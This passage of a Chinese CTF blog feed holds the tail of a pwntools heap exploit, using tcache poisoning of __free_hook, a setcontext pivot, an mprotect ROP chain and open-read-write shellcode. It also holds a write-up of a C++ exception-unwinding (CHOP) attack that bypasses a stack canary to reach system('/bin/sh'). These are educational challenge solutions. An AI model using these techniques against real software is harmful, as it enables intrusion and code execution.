p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(value)</span></span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># size取决于我们创建时的输入</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,value</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the value: &#x27;</span>,value)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;s4cur1ty_p4ssw0rd&#x27;</span></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line"><span class="comment"># 4dm1n</span></span><br><span class="line"><span class="comment"># 985da4f8cb37zkj</span></span><br><span class="line"><span class="comment"># s4cur1ty_p4ssw0rd</span></span><br><span class="line"><span class="comment"># glibc 2.27 heap 沙箱no execve</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input your username:&#x27;</span>, <span class="string">b&#x27;4dm1n&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input your password:&#x27;</span>, <span class="string">b&#x27;985da4f8cb37zkj&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0-6 填入tcache，7进unsorted,加一个8分割</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    add(i,(<span class="number">0x290</span>),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x290</span>)</span><br><span class="line">    <span class="comment">#print(f&quot;alloc &#123;i&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">    <span class="comment">#print(f&quot;delete &#123;i&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">leak_addr=show(<span class="number">7</span>)<span class="comment"># delete会还原内容，而泄露会再过一遍rc4</span></span><br><span class="line">leak_addr=cipher.decrypt(leak_addr)</span><br><span class="line">leak_addr=u64(leak_addr[:<span class="number">8</span>])</span><br><span class="line">main_arena_addr=leak_addr-<span class="number">96</span></span><br><span class="line">libc_base=main_arena_addr-<span class="number">0x3ebca0</span>+<span class="number">0x60</span></span><br><span class="line">libc.address=libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每次重新初始化，这是个流密码不然会继续，草</span></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">leak_addr=show(<span class="number">1</span>)</span><br><span class="line">leak_addr=cipher.decrypt(leak_addr)</span><br><span class="line"><span class="built_in">print</span>(leak_addr)</span><br><span class="line">leak_addr=u64(leak_addr[:<span class="number">8</span>])</span><br><span class="line">heap_base=leak_addr-<span class="number">0x1670</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] heap_base: <span class="subst">&#123;<span class="built_in">hex</span>(heap_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunks : $rebase(0x203080)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始</span></span><br><span class="line">free_hook=libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="comment"># malloc_hook=libc_base + 0x3ebc30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] free_hook: &quot;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line">gadget=libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line"><span class="comment"># open_addr=libc.symbols[&#x27;open&#x27;]</span></span><br><span class="line"><span class="comment"># read_addr=libc.symbols[&#x27;read&#x27;]</span></span><br><span class="line"><span class="comment"># write_addr=libc.symbols[&#x27;write&#x27;]</span></span><br><span class="line"><span class="comment"># print(&quot;[+] orw: &quot;,hex(open_addr),hex(read_addr),hex(write_addr))</span></span><br><span class="line">mprotect=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>) <span class="comment"># 把tcache里开始的0x50拿出来</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">payload1=p64(free_hook)</span><br><span class="line">payload1=cipher.encrypt(payload1)</span><br><span class="line">edit(<span class="number">9</span>,payload1)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>) <span class="comment"># 下一个是freehook</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake_stack=heap_base+0x1670</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x2164f</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x23a6a</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x1b96</span></span><br><span class="line">ret = libc_base + <span class="number">0x8aa</span></span><br><span class="line">buffer=heap_base+<span class="number">0x3000</span> <span class="comment"># 随便写的</span></span><br><span class="line">shellcode = (</span><br><span class="line">    shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">    + shellcraft.read(<span class="string">&quot;rax&quot;</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">    + shellcraft.write(<span class="number">1</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">)</span><br><span class="line">shellcode=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+p64(ret)+p64(pop_rdi)+p64(heap_base)+p64(pop_rsi)+p64(<span class="number">0x7000</span>)+p64(pop_rdx)+p64(<span class="number">0x7</span>)+p64(mprotect)+p64(heap_base+<span class="number">0x1670</span>+<span class="number">0x58</span>)+asm(shellcode)</span><br><span class="line"><span class="comment"># fake_stack=b&#x27;\x00&#x27;*0x10</span></span><br><span class="line"><span class="comment"># fake_stack+=p64(pop_rdi)+p64(heap_base+0x24c8)+p64(pop_rsi)+p64(0)+p64(libc_base+0x10fbf0)</span></span><br><span class="line"><span class="comment"># fake_stack+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx)+p64(0x40)+p64(libc_base+0x110020)</span></span><br><span class="line"><span class="comment"># fake_stack+=p64(pop_rdi)+p64(1)+p64(libc_base+0x1100f0)</span></span><br><span class="line"><span class="comment"># fake_stack+=b&#x27;flag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tmd有点看运气，地址随机里面有0a就gg</span></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b free&#x27;</span>)</span><br><span class="line"><span class="comment"># free1 将栈迁移到0上</span></span><br><span class="line"><span class="comment"># 还有一个问题就是迁移时候的指令状态</span></span><br><span class="line">payload2=<span class="string">b&#x27;z&#x27;</span>*<span class="number">0xa0</span>+p64(heap_base+<span class="number">0x1670</span>+<span class="number">0x10</span>)+p64(ret)</span><br><span class="line"><span class="comment"># 读到0xa会断，所以free掉让它变明文？？？</span></span><br><span class="line"></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">edit(<span class="number">1</span>,payload2)<span class="comment">#这个能通</span></span><br><span class="line"></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">edit(<span class="number">0</span>,shellcode)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">cipher=ARC4.new(key)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x40</span>,cipher.encrypt(p64(gadget))) </span><br><span class="line"><span class="comment">#free_hook写入了gadget，下次free会将栈迁移到free的chunk+0xa0写的内容</span></span><br><span class="line"><span class="comment"># 到这都成功了</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;题目分析&lt;/h1&gt;
&lt;p&gt;Glibc2.27，64位保护全开，沙箱ban掉了execve和execveat，打orw。&lt;/p&gt;
&lt;h2 id=&quot;爆破用户名和密码&quot;&gt;爆破用户名和密码&lt;/h2&gt;
&lt;p&gt;这个程序上来先在远程打开了用户名和密码的文件要我们输入，找了半天没找到题目</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
    <category term="heap" scheme="https://zjw1nd.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>CHOP——强网杯2024expect_number wp</title>
    <link href="https://zjw1nd.github.io/2024/11/10/CHOP%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024expect-number-wp/"/>
    <id>https://zjw1nd.github.io/2024/11/10/CHOP%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024expect-number-wp/</id>
    <published>2024-11-10T15:27:20.000Z</published>
    <updated>2024-11-20T12:42:03.374Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考自<a href="https://xz.aliyun.com/t/12967">溢出漏洞在异常处理中的攻击利用手法-上</a>和<a href="https://xz.aliyun.com/t/12994">溢出漏洞在异常处理中的攻击利用手法-下</a></p></blockquote><h1>简单了解下C++异常处理</h1><p>C++有这样的关键字，支持执行异常的处理：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="built_in">do_sth</span>();</span><br><span class="line">    <span class="keyword">throw</span> exception;</span><br><span class="line">    <span class="built_in">nothing_will_happen_here</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span>(exception typeA)&#123;</span><br><span class="line">    <span class="built_in">my_handler</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span>(exception typeB)&#123;</span><br><span class="line">    <span class="built_in">my_handler2</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于C++的异常处理：</p><blockquote><p><a href="https://www.cnblogs.com/sgawscd/p/13870406.html">https://www.cnblogs.com/sgawscd/p/13870406.html</a><br><a href="https://blog.csdn.net/GrayOnDream/article/details/138469330">https://blog.csdn.net/GrayOnDream/article/details/138469330</a>  &lt;-- 具体的细节参考这一篇即可</p></blockquote><p>简单的来说，任何函数都可以通过throw关键字抛出异常。对于可能抛出异常的代码，要用try去包裹。而后续需要用catch去捕获异常。<br>catch可以在后面添加类型来声明catch内处理的异常类型。触发throw后，在开发者的视角下，会从抛出异常的try块向外匹配第一个类型合适的catch块，然后程序会将控制权移交到catch块中的异常处理代码。此时throw后面的代码全部都不会执行，因此这种控制流的强行跳转给了我们利用的机会。这种对于catch逐层向上的匹配机制，叫做<strong>栈展开(Stack Unwind)</strong>。</p><h2 id="libstdc-的异常处理实现">libstdc++的异常处理实现</h2><p>下面以linux的libstdc++的实现为例大概看一下throw之后发生了什么</p><p>首先，当使用throw关键字的时候，编译器会先用<code>__cxa_allocate_exception</code>分配一些处理所需要的对象空间。然后程序会调用<code>__cxa_throw()</code>抛出异常，最后核心函数会进入<code>_Unwind_RaiseException()</code>。再后面就是gdb跟进困难的内容了，具体细节不再赘述。不过会用Unwind以及程序中<code>eh_frame</code>节中相关的信息去对堆栈进行回溯。</p><p>既然会回溯找代码，那么一定会设计到堆栈中pc的恢复，也就是返回地址。如果我们能够覆盖try块的返回地址然后去throw，就可能能劫持到控制流到其他的catch块（不是其他catch块的话，回溯到main发现没有catch代码，会被terminate退出）</p><p>另外，由于throw后面的内容其实都根本不会执行，所以这个操作能够绕过canary（check根本不执行，覆盖了canary也没事），这是比较神奇的一点。</p><h1>对于这道题目</h1><h2 id="流程分析">流程分析</h2><p>这一部分我们不多讲，程序是通过一个以1为种子的伪随机数序列，然后通过用户输入0 1 2进行加，乘，除操作。程序提供了一个<br>system gift（但是没用）。</p><p>指针初始化在initarray，程序有4个类，一个基类和3个派生（猜测这是为了让它们函数虚表的地址相邻），其中两个派生类一个是退出一个是存在溢出的漏洞函数。5010-&gt;5520-&gt;vtable-&gt;func</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">data.rel.ro:<span class="number">0000000000004</span>C20 ; `vtable <span class="keyword">for</span><span class="number">&#x27;</span>Derived3</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C20 _ZTV8Derived3   dq <span class="number">0</span>                    ; offset to this</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C28                 dq offset _ZTI8Derived3 ; `typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Derived3</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C30 off_4C30        dq offset display_d3    ; DATA XREF: set_d3_display+<span class="number">1</span>C↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C38 ; `vtable <span class="keyword">for</span><span class="number">&#x27;</span>Derived2</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C38 _ZTV8Derived2   dq <span class="number">0</span>                    ; offset to this</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C40                 dq offset _ZTI8Derived2 ; `typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Derived2</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C48 quit_ptr        dq offset quit          ; DATA XREF: set_quit+<span class="number">1</span>C↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C50 ; `vtable <span class="keyword">for</span><span class="number">&#x27;</span>Derived</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C50 _ZTV7Derived    dq <span class="number">0</span>                    ; offset to this</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C58                 dq offset _ZTI7Derived  ; `typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Derived</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C60 vuln_off        dq offset vuln          ; DATA XREF: init_game+<span class="number">1</span>C↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C68 ; `vtable <span class="keyword">for</span><span class="number">&#x27;B</span>ase</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C68 _ZTV4Base       dq <span class="number">0</span>                    ; offset to this</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C70                 dq offset _ZTI4Base     ; `typeinfo <span class="keyword">for</span><span class="number">&#x27;B</span>ase</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C78 base_display_ptr dq offset base_display ; DATA XREF: set_base_display_ptr+C↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C80                 public _ZTISt13runtime_error ; weak</span><br></pre></td></tr></table></figure><p>5520正好在输入结构的+288位置，重复288次输入没有考虑结构体头的12字节，可以溢出12字节。但是每次写入之后前一个就会被覆盖为上次操作我们实际上只能溢出1个字节。恰巧的是，1个就够了，50-&gt;60即可总之我们就利用程序的逻辑和一个offbyone的漏洞将正常退出的指针劫持到了虚表里另一个派生类的漏洞函数上。</p><p>我们重点关注这个有栈溢出的后门：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="built_in">std</span>::runtime_error *exception; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE buf[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;();</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL) &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    exception = (<span class="built_in">std</span>::runtime_error *)__cxa_allocate_exception(<span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="built_in">std</span>::runtime_error::runtime_error(exception, <span class="string">&quot;Input too long&quot;</span>);</span><br><span class="line">    __cxa_throw(exception,</span><br><span class="line">    (<span class="keyword">struct</span> type_info *)&amp;`typeinfo forstd`::runtime_error,</span><br><span class="line">    (<span class="type">void</span> (*)(<span class="type">void</span> *))&amp;<span class="built_in">std</span>::runtime_error::~runtime_error);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时程序里还有这样的catch块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000024E1</span> ; __unwind &#123; <span class="comment">// __gxx_personality_v0</span></span><br><span class="line">.text:<span class="number">00000000000024E1</span>                 endbr64</span><br><span class="line">.text:<span class="number">00000000000024E5</span>                 push    rbp</span><br><span class="line">.text:<span class="number">00000000000024E6</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000000024E9</span>                 push    rbx</span><br><span class="line">.text:<span class="number">00000000000024</span>EA                 sub     rsp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000000000024</span>EE                 mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000000000024F</span>7                 mov     [rbp+var_18], rax</span><br><span class="line">.text:<span class="number">00000000000024F</span>B                 xor     eax, eax</span><br><span class="line">.text:<span class="number">00000000000024F</span>D                 mov     [rbp+var_24], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000002504</span>                 lea     rax, [rbp+var_24]</span><br><span class="line">.text:<span class="number">0000000000002508</span>                 mov     rsi, rax</span><br><span class="line">.text:<span class="number">000000000000250B</span>                 lea     rax, _ZSt3cin   ; <span class="built_in">std</span>::<span class="built_in">cin</span></span><br><span class="line">.text:<span class="number">0000000000002512</span>                 mov     rdi, rax</span><br><span class="line">.text:<span class="number">0000000000002515</span> ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000002515</span>                 call    __ZNSirsERi     ; <span class="built_in">std</span>::istream::operator&gt;&gt;(<span class="type">int</span> &amp;)</span><br><span class="line">.text:<span class="number">0000000000002515</span> ;   &#125; <span class="comment">// starts at 2515</span></span><br><span class="line">.text:<span class="number">000000000000251</span>A                 mov     eax, [rbp+var_24]</span><br><span class="line">.text:<span class="number">000000000000251</span>D                 jmp     <span class="type">short</span> loc_256A</span><br><span class="line">.text:<span class="number">000000000000251F</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000000251F</span> ;   catch(<span class="built_in">std</span>::runtime_error) <span class="comment">// owned by 2515</span></span><br><span class="line">.text:<span class="number">000000000000251F</span>                 endbr64</span><br><span class="line">.text:<span class="number">0000000000002523</span>                 cmp     rdx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000002527</span>                 jz      <span class="type">short</span> loc_2531</span><br><span class="line">.text:<span class="number">0000000000002529</span>                 mov     rdi, rax        ; <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">000000000000252</span>C                 call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">0000000000002531</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000002531</span></span><br><span class="line">.text:<span class="number">0000000000002531</span> loc_2531:                               ; CODE XREF: <span class="built_in">cin</span>+<span class="number">46</span>↑j</span><br><span class="line">.text:<span class="number">0000000000002531</span>                 mov     rdi, rax        ; <span class="type">void</span> *</span><br><span class="line">.text:<span class="number">0000000000002534</span>                 call    ___cxa_begin_catch</span><br><span class="line">.text:<span class="number">0000000000002539</span>                 mov     [rbp+var_20], rax</span><br><span class="line">.text:<span class="number">000000000000253</span>D                 lea     rax, command    ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">0000000000002544</span>                 mov     rdi, rax        ; command</span><br><span class="line">.text:<span class="number">0000000000002547</span> ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000002547</span>                 call    _system  ; ------&gt; system</span><br><span class="line">.text:<span class="number">0000000000002547</span> ;   &#125; <span class="comment">// starts at 2547</span></span><br><span class="line">.text:<span class="number">000000000000254</span>C                 call    ___cxa_end_catch</span><br><span class="line">.text:<span class="number">0000000000002551</span>                 jmp     <span class="type">short</span> loc_256A</span><br><span class="line">.text:<span class="number">0000000000002553</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000002553</span> ;   cleanup() <span class="comment">// owned by 2547</span></span><br><span class="line">.text:<span class="number">0000000000002553</span>                 endbr64</span><br><span class="line">.text:<span class="number">0000000000002557</span>                 mov     rbx, rax</span><br><span class="line">.text:<span class="number">000000000000255</span>A                 call    ___cxa_end_catch</span><br><span class="line">.text:<span class="number">000000000000255F</span>                 mov     rax, rbx</span><br><span class="line">.text:<span class="number">0000000000002562</span>                 mov     rdi, rax        ; <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">0000000000002565</span>                 call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">000000000000256</span>A ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000000256</span>A</span><br><span class="line">.text:<span class="number">000000000000256</span>A loc_256A:                               ; CODE XREF: <span class="built_in">cin</span>+<span class="number">3</span>C↑j</span><br><span class="line">.text:<span class="number">000000000000256</span>A                                         ; <span class="built_in">cin</span>+<span class="number">70</span>↑j</span><br><span class="line">.text:<span class="number">000000000000256</span>A                 mov     rdx, [rbp+var_18]</span><br><span class="line">.text:<span class="number">000000000000256</span>E                 sub     rdx, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0000000000002577</span>                 jz      <span class="type">short</span> loc_257E</span><br><span class="line">.text:<span class="number">0000000000002579</span>                 call    ___stack_chk_fail</span><br><span class="line">.text:<span class="number">000000000000257</span>E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000000257</span>E</span><br><span class="line">.text:<span class="number">000000000000257</span>E loc_257E:                               ; CODE XREF: <span class="built_in">cin</span>+<span class="number">96</span>↑j</span><br><span class="line">.text:<span class="number">000000000000257</span>E                 mov     rbx, [rbp+var_8]</span><br><span class="line">.text:<span class="number">0000000000002582</span>                 leave</span><br><span class="line">.text:<span class="number">0000000000002583</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000002583</span> ; &#125; <span class="comment">// starts at 24E1</span></span><br><span class="line">.text:<span class="number">0000000000002583</span> <span class="built_in">cin</span>             endp</span><br></pre></td></tr></table></figure><p>想办法让程序返回到这就可以了。本着实践大于理论的原则比赛的时候试了好久（其实也就一小时可能）都没成，结果是要返回到0x251a，我就低了5个字节。</p><p>事实上是，将返回地址填成我们想要跳转到的catch块，rbp的值只要是一个可读写的地址就行了，防止中间汇编rbp寻址的时候sigsegv。</p><h1>几个小问题</h1><h2 id="程序怎么识别的try-catch块？">程序怎么识别的try-catch块？</h2><p>编译器为程序生成了一个异常处理表<code>.gcc_except_table</code>，作为一个单独的节存放相关的信息。</p><h2 id="rbp的作用？">rbp的作用？</h2><p>如果在handler中有<code>leave;ret</code>的gadget，我们理论上在溢出后控制rbp就能劫持控制流。其他情况下一般要注意rbp地址有效。</p><h2 id="注意：">注意：</h2><p>这个ret地址的范围并不精确，尽量要写到带有catch的函数的try范围内，如果不成功一定要换附近地址多试几次，血泪教训。</p><h1>什么是CHOP?</h1><p>CHOP是Catch Handler Oriented Programming。出自一篇论文，更多的可以去看开篇提到的blog。总之这玩意的思想就是：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cxa_call_unexpected (<span class="type">void</span> *exc_obj_in) &#123;</span><br><span class="line"> xh_terminate_handler = xh-&gt;terminateHandler;</span><br><span class="line"> <span class="keyword">try</span> &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"> <span class="built_in">catch</span> (...) &#123;</span><br><span class="line"> __terminate(xh_terminate_handler);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __terminate (<span class="built_in">void</span> (*handler)()) <span class="keyword">throw</span> () &#123;</span><br><span class="line"> <span class="comment">/* ... */</span></span><br><span class="line"> <span class="built_in">handler</span>();</span><br><span class="line"> std::<span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有函数指针的地方就有pwn，libstdc++中有这样一个调用指针的地方。如果异常处理前存在栈溢出能劫持返回地址，我们控制好xh_terminate_handler这一局部变量后返回到<code>__cxa_call_unexpected</code>的catch块就能实现控制流劫持。通过这个Golden Gadget，我们可以将有canary的栈溢出变成无canary的栈溢出，只需要以这个catch做跳板。</p><p>版本更高的libc也只是调用路径更复杂了。</p><p>摸了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;参考自&lt;a href=&quot;https://xz.aliyun.com/t/12967&quot;&gt;溢出漏洞在异常处理中的攻击利用手法-上&lt;/a&gt;和&lt;a href=&quot;https://xz.aliyun.com/t/12994&quot;&gt;溢出漏洞在异常处理中的攻击利用手法</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
